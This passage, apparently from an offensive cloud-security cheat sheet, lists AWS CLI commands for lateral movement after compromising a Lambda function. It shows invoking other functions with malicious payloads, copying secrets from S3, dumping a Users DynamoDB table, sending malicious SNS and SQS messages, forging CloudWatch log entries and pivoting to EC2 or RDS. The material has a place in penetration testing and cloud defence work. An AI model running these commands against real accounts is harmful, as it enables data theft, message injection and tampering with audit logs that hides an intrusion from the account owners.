  --function-name other-function \
  --payload '{"data": "malicious"}' \
  output.json

# 2. Access S3 buckets:
aws s3 ls s3://sensitive-bucket
aws s3 cp s3://sensitive-bucket/secrets.txt -

# 3. Query DynamoDB:
aws dynamodb scan --table-name Users

# 4. Publish to SNS:
aws sns publish \
  --topic-arn <arn> \
  --message "malicious message"

# 5. Send SQS messages:
aws sqs send-message \
  --queue-url <url> \
  --message-body "malicious"

# 6. Modify CloudWatch Logs:
aws logs create-log-stream --log-group-name <name> --log-stream-name attack
aws logs put-log-events --log-group-name <name> --log-stream-name attack --log-events timestamp=<ts>,message="fake log"

# 7. EC2 access (if VPC Lambda):
# Pivot to EC2 instances in same VPC
# Or access RDS databases
{% endraw %}
</lateral_movement>
